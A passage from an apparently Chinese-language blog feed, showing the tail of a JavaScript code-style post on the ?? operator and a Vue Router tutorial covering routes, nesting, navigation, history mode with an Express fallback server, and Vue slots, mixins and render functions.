class="line">&#125;</span><br></pre></td></tr></table></figure><p>像下面这样，通过检查布尔值来确定是否调用函数，代码太多了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isPrime) &#123;</span><br><span class="line">    startWatching();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能否通过 AND（&amp;&amp;）运算符使用简写形式？是的，完全可以避免使用 if 语句。酷吧！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isPrime &amp;&amp; startWatching();</span><br></pre></td></tr></table></figure><h2 id="空值合并运算符-‘-’"><a href="#空值合并运算符-‘-’" class="headerlink" title="空值合并运算符 ‘??’"></a>空值合并运算符 ‘??’</h2><p>值既不是 <code>null</code> 也不是 <code>undefined</code> 的表达式称为“已定义的（defined）”。</p><p><code>a ?? b</code> 的结果是：</p><ul><li>如果 <code>a</code> 是已定义的，则结果为 <code>a</code>，</li><li>如果 <code>a</code> 不是已定义的，则结果为 <code>b</code>。</li><li>如果第一个参数不是 <code>null/undefined</code>，则 <code>??</code> 返回第一个参数。否则，返回第二个参数。</li></ul><p>通常 <code>??</code> 的使用场景是，为可能是未定义的变量提供一个默认值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user;</span><br><span class="line"></span><br><span class="line">alert(user ?? <span class="string">"Anonymous"</span>); <span class="comment">// Anonymous</span></span><br></pre></td></tr></table></figure><h3 id="与-比较"><a href="#与-比较" class="headerlink" title="与 || 比较"></a>与 || 比较</h3><p>它们之间重要的区别是：</p><ul><li><code>||</code> 返回第一个 <strong>真</strong> 值。</li><li><code>??</code> 返回第一个 <strong>已定义的</strong> 值。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> height = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">alert(height || <span class="number">100</span>); <span class="comment">// 100</span></span><br><span class="line">alert(height ?? <span class="number">100</span>); <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><p><img src="https://user-gold-cdn.xitu.io/2019/12/8/16ee5d1906e604f1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 代码规范 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue Router</title>
      <link href="2020/09/13/%E6%95%B4%E7%90%86-Vue-Router/"/>
      <url>2020/09/13/%E6%95%B4%E7%90%86-Vue-Router/</url>
      
        <content type="html"><![CDATA[<ul><li>Vue Router 使用步骤</li><li>动态路由</li><li>嵌套路由</li><li>编程式导航</li><li>hash模式和history模式</li><li>模拟实现 Vue Router</li></ul><a id="more"></a><h2 id="Vue-Router-使用步骤"><a href="#Vue-Router-使用步骤" class="headerlink" title="Vue Router 使用步骤"></a>Vue Router 使用步骤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├───public</span><br><span class="line">└───src</span><br><span class="line">    ├───assets</span><br><span class="line">    ├───components</span><br><span class="line">    ├───router</span><br><span class="line">      ├───index.js</span><br><span class="line">    ├───views</span><br><span class="line">      ├───Blog.vue</span><br><span class="line">      ├───Index.vue</span><br><span class="line">      ├───Photo.vue</span><br><span class="line">    ├───App.vue</span><br><span class="line">    └───main.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// router/index.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="keyword">import</span> Index <span class="keyword">from</span> <span class="string">'../views/Index.vue'</span></span><br><span class="line"><span class="comment">// 1. 注册路由插件</span></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由规则</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/'</span>,</span><br><span class="line">    name: <span class="string">'Index'</span>,</span><br><span class="line">    component: Index</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/blog'</span>,</span><br><span class="line">    name: <span class="string">'Blog'</span>,</span><br><span class="line">    <span class="comment">// route level code-splitting</span></span><br><span class="line">    <span class="comment">// this generates a separate chunk (about.[hash].js) for this route</span></span><br><span class="line">    <span class="comment">// which is lazy-loaded when the route is visited.</span></span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: "blog" */</span> <span class="string">'../views/Blog.vue'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/photo'</span>,</span><br><span class="line">    name: <span class="string">'Photo'</span>,</span><br><span class="line">    <span class="comment">// route level code-splitting</span></span><br><span class="line">    <span class="comment">// this generates a separate chunk (about.[hash].js) for this route</span></span><br><span class="line">    <span class="comment">// which is lazy-loaded when the route is visited.</span></span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: "photo" */</span> <span class="string">'../views/Photo.vue'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">// 2. 创建 router 对象</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="comment">// 3. 注册 router 对象</span></span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;img src=&quot;@/assets/logo.png&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;nav&quot;&gt;</span><br><span class="line">      &lt;!-- 5. 创建链接 --&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;Index&lt;/router-link&gt; |</span><br><span class="line">      &lt;router-link to=&quot;/blog&quot;&gt;Blog&lt;/router-link&gt; |</span><br><span class="line">      &lt;router-link to=&quot;/photo&quot;&gt;Photo&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 4. 创建路由组建的占位 --&gt;</span><br><span class="line">    &lt;router-view/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><blockquote><p>router-view 是用来渲染通过路由映射过来的组件，当路径更改时， 中的内容也会发生更改</p><p>主要应用于单页面中，与router-link配合，渲染router-link 映射过来的组件。</p></blockquote><h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>在vue项目中，使用vue-router如果进行不传递参数的路由模式，则称为静态路由；如果能够传递参数，对应的路由数量是不确定的，此时的路由称为动态路由。动态路由，是以冒号为开头的(:)，例子如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="keyword">import</span> Index <span class="keyword">from</span> <span class="string">'../views/Index.vue'</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/'</span>,</span><br><span class="line">    name: <span class="string">'Index'</span>,</span><br><span class="line">    component: Index</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/detail/:id'</span>, <span class="comment">// id占位符</span></span><br><span class="line">    name: <span class="string">'Detail'</span>,</span><br><span class="line">    <span class="comment">// 开启 props，会把 URL 中的参数传递给组件</span></span><br><span class="line">    <span class="comment">// 在组件中通过 props 来接收 URL 参数</span></span><br><span class="line">    props: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// route level code-splitting</span></span><br><span class="line">    <span class="comment">// this generates a separate chunk (about.[hash].js) for this route</span></span><br><span class="line">    <span class="comment">// which is lazy-loaded when the route is visited.</span></span><br><span class="line">    <span class="comment">// 只有使用的时候才加载详情页</span></span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: "detail" */</span> <span class="string">'../views/Detail.vue'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;nav&quot;&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;Index&lt;/router-link&gt; |</span><br><span class="line">      &lt;router-link to=&quot;/detail/11&quot;&gt;Detail&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;router-view/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Detail.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 方式1： 通过当前路由规则，获取数据 --&gt;</span><br><span class="line">    通过当前路由规则获取：&#123;&#123; $route.params.id &#125;&#125;</span><br><span class="line"></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 方式2：路由规则中开启 props 传参 --&gt;</span><br><span class="line">    通过开启 props 获取：&#123;&#123; id &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;Detail&apos;,</span><br><span class="line">  props: [&apos;id&apos;]</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><p><img src="https://s1.ax1x.com/2020/09/13/wwzc4K.png" alt="wwzc4K.png"></p><blockquote><p>抽取公共组件 layout.vue 存储 header 和 footer</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="comment">// 加载组件</span></span><br><span class="line"><span class="keyword">import</span> Layout <span class="keyword">from</span> <span class="string">'@/components/Layout.vue'</span></span><br><span class="line"><span class="keyword">import</span> Index <span class="keyword">from</span> <span class="string">'@/views/Index.vue'</span></span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">'@/views/Login.vue'</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'login'</span>,</span><br><span class="line">    path: <span class="string">'/login'</span>,</span><br><span class="line">    component: Login</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 嵌套路由</span></span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/'</span>,</span><br><span class="line">    component: Layout,</span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">'index'</span>,</span><br><span class="line">        path: <span class="string">''</span>,</span><br><span class="line">        component: Index</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">'detail'</span>,</span><br><span class="line">        path: <span class="string">'detail/:id'</span>,</span><br><span class="line">        props: <span class="literal">true</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'@/views/Detail.vue'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><h2 id="编程式导航的几种方法"><a href="#编程式导航的几种方法" class="headerlink" title="编程式导航的几种方法"></a>编程式导航的几种方法</h2><ul><li>this.$router.push：跳转到指定URL，向history栈添加一个新的记录，点击后退会返回至上一个页面</li><li><p>this.$router.replace：跳转到指定URL，替换history栈中最后一个记录，点击后退会返回至上上一个页面</p></li><li><p>this.$router.go(n)：向前或向后跳转n个页面，n可正（向后跳转）可负（向前跳转）</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(&#123; <span class="attr">name</span>: <span class="string">'Detail'</span>, <span class="attr">params</span>: &#123; <span class="attr">id</span>: <span class="number">1</span> &#125; &#125;)</span><br><span class="line"><span class="keyword">this</span>.$router.replace(<span class="string">'/login'</span>)</span><br><span class="line"><span class="keyword">this</span>.$router.go(<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回主页</span></span><br><span class="line"><span class="keyword">this</span>.$router.push(<span class="string">'/'</span>)</span><br><span class="line"><span class="comment">// this.$router.push(&#123; name: 'Home' &#125;)</span></span><br></pre></td></tr></table></figure><h2 id="hash模式和history模式"><a href="#hash模式和history模式" class="headerlink" title="hash模式和history模式"></a>hash模式和history模式</h2><h3 id="history模式的使用"><a href="#history模式的使用" class="headerlink" title="history模式的使用"></a>history模式的使用</h3><ul><li>通过history.pushState()方法改变地址栏</li><li>监听popstate事件</li><li><p>根据当前路由地址找到对应组件进行重新渲染</p></li><li><p>History需要服务器的支持</p></li><li>单页应用中，服务端不存在<code>http:www.testurl.com/login</code>这样的地址会返回找不到该页面</li><li>在服务端应该除了静态资源外都返回单页应用的<code>index.html</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个简单的 node 服务器</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="comment">// 导入处理 history 模式的模块</span></span><br><span class="line"><span class="keyword">const</span> history = <span class="built_in">require</span>(<span class="string">'connect-history-api-fallback'</span>)</span><br><span class="line"><span class="comment">// 导入 express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="comment">// 注册处理 history 模式的中间件，一旦客户端请求不存在的地址，服务端都会返回单页的index.html</span></span><br><span class="line">app.use(history())</span><br><span class="line"><span class="comment">// 处理静态资源的中间件，网站根目录 ../web</span></span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'../web'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启服务器，端口是 3000</span></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'服务器开启，端口：3000'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>同样的在nginx服务器中也可以配置返回<code>index.html</code>，客户端来判断路由地址对应展示内容。</p><h3 id="hash模式的使用"><a href="#hash模式的使用" class="headerlink" title="hash模式的使用"></a>hash模式的使用</h3><ul><li>URL中#后面的内容作为路径地址</li><li>监听hashchange事件</li><li>根据当前路由地址找到对应组件重新渲染</li></ul><h2 id="模拟实现-Vue-Route"><a href="#模拟实现-Vue-Route" class="headerlink" title="模拟实现 Vue Route"></a>模拟实现 Vue Route</h2><p>前置知识：</p><ul><li>vue的构建版本 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运行时版：不支持 template 模板，需要打包的时候提前编译，如果你打包的时候是用vue-loader 或者 vueify，将`*.vue文件内的templates编译成JavaScript代码， 你就不需要compiler, 可以使用 runtime-only版本编译。</span><br><span class="line"></span><br><span class="line">完整版：包含运行时和编译器，体积比运行时版大10K左右，程序运行时把模板转换成render函数</span><br><span class="line"></span><br><span class="line">vue-cli默认创建运行时版</span><br></pre></td></tr></table></figure><ul><li>slot插槽</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"app"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aaa</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">p</span> <span class="attr">slot</span> = <span class="string">"s1"</span>&gt;</span>在上面的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">p</span> <span class="attr">slot</span> = <span class="string">"s2"</span>&gt;</span>在下面的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"aaa"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"aaa"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span> = <span class="string">"s1"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是aaa组件<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span> = <span class="string">"s2"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>混入mixin</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个混入对象</span></span><br><span class="line"><span class="keyword">var</span> myMixin = &#123;</span><br><span class="line">  created: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.hello()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    hello: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'hello from mixin!'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个使用混入对象的组件</span></span><br><span class="line"><span class="keyword">var</span> Component = Vue.extend(&#123;</span><br><span class="line">  mixins: [myMixin]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> component = <span class="keyword">new</span> Component() <span class="comment">// =&gt; "hello from mixin!"</span></span><br></pre></td></tr></table></figure><ul><li>render函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">简单的说，在vue中我们使用模板HTML语法组建页面的，使用render函数我们可以用js语言来构建DOM</span><br><span class="line"></span><br><span class="line">因为vue是虚拟DOM，所以在拿到template模板时也要转译成VNode的函数，而用render函数构建DOM，vue就免去了转译的过程。</span><br><span class="line"></span><br><span class="line">当使用render函数描述虚拟DOM时，vue提供一个函数，这个函数是就构建虚拟DOM所需要的工具。官网上给他起了个名字叫createElement。还有约定的简写叫h,</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">myslot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">myslot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"myslot"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">"level==1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">"level==2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-if</span>=<span class="string">"level==3"</span>&gt;</span></span><br><span 